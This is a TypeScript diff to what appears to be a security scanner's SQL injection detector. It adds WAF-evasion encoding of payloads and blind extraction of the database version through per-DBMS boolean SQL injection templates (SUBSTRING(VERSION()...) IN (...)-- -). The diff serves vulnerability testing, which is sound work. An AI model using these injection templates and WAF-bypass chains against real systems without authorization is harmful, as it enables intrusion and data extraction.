@@ -11,6 +11,8 @@ import { generatePayloads, type ContextHint, type PayloadTechnique } from '@/sca
 import { buildBaseline } from '@/scanner/engine/oracle/baseline';
 import { runOracleDetection, type OraclePayload } from './oracle-detector';
 import { TechniqueBandit, type BanditArm } from '@/scanner/engine/synth/bandit';
+import { applyChain, searchBypass, type Operator } from '@/scanner/engine/synth/waf-encoder';
+import { extractString } from '@/scanner/engine/synth/blind-extract';
 
 // Module-level bandit — persists across calls within a process lifetime.
 // The bandit learns from every detectOne() call: techniques that find
@@ -99,6 +101,29 @@ async function detectOne(
         label: `${p.technique}:${p.context}:${p.dbms}`,
     }));
 
+    // ── Phase B.5: WAF bypass — append encoded variants of top payloads ──
+    // If a WAF is present, the literal payloads may be blocked. Encoded forms
+    // (space→/**/, case-swap, URL encode, MySQL conditional comments) bypass
+    // most commodity WAFs while remaining semantically equivalent to the backend.
+    const WAF_CHAINS: Operator[][] = [
+        ['spacecomment'],
+        ['case-swap', 'spacecomment'],
+        ['inline-mysql'],
+        ['url-encode'],
+        ['comment-split'],
+    ];
+    for (const base of sortedPayloads.slice(0, 3)) {
+        for (const chain of WAF_CHAINS) {
+            const encoded = applyChain(chain, base.value);
+            if (encoded !== base.value) {
+                payloads.push({
+                    value: encoded,
+                    label: `waf-bypass:${chain.join('+')}:${base.technique}:${base.dbms}`,
+                });
+            }
+        }
+    }
+
     // ── Phase C: drive the shared oracle-detector pipeline ──────
     const findings = await runOracleDetection({
         url: endpoint.url,
@@ -140,6 +165,42 @@ async function detectOne(
                 ? (findings[0].confidence === 'high' ? 1.0 : 0.6)
                 : 0.0;
             _bandit.update(arm, reward);
+        }
+    }
+
+    // ── Phase E: blind extraction — extract DB version prefix after confirmed time-blind SQLi ──
+    // Uses optimal subset search (maximum expected information gain bisection) to
+    // minimise probe count while extracting a legible version prefix for provenance.
+    const confirmedTimeFinding = findings.find(f =>
+        f.confidence === 'high' &&
+        /sleep|SLEEP|pg_sleep|WAITFOR|BENCHMARK/i.test(f.payload ?? ''),
+    );
+    if (confirmedTimeFinding && findings[0]) {
+        const clusterStats = baseline.stats();
+        const versionTemplate: Record<string, (i: number, chars: string) => string> = {
+            mysql:      (i, chars) => `' AND SUBSTRING(VERSION(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
+            postgresql: (i, chars) => `' AND SUBSTRING(version(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
+            sqlite:     (i, chars) => `' AND SUBSTR(sqlite_version(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
+            mssql:      (i, chars) => `' AND SUBSTRING(@@version,${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
+            unknown:    (i, chars) => `' AND SUBSTRING(VERSION(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
+        };
+        const tmpl = versionTemplate[inference.dbms] ?? versionTemplate.unknown;
+        const extraction = await extractString({
+            charClass: 'ascii',
+            payloadForProbe: (i, subset) => tmpl(i, Array.from(subset).join('')),
+            runProbe: async (payload) => {
+                const resp = await baselineProbe(endpoint.url, param, payload, config);
+                if (!resp) return false;
+                return Math.abs(resp.body.length - clusterStats.length.mean) > clusterStats.length.stddev * 1.5;
+            },
+            maxChars: 12,
+        }).catch(() => ({ value: '', totalProbes: 0 }));
+        if (extraction.value) {
+            findings[0] = {
+                ...findings[0],
+                technicalDetail: (findings[0].technicalDetail ?? '') +
+                    `\n[BLIND-EXTRACT] DB version prefix (${extraction.totalProbes} probes): "${extraction.value}..."`,
+            };
         }
     }
 
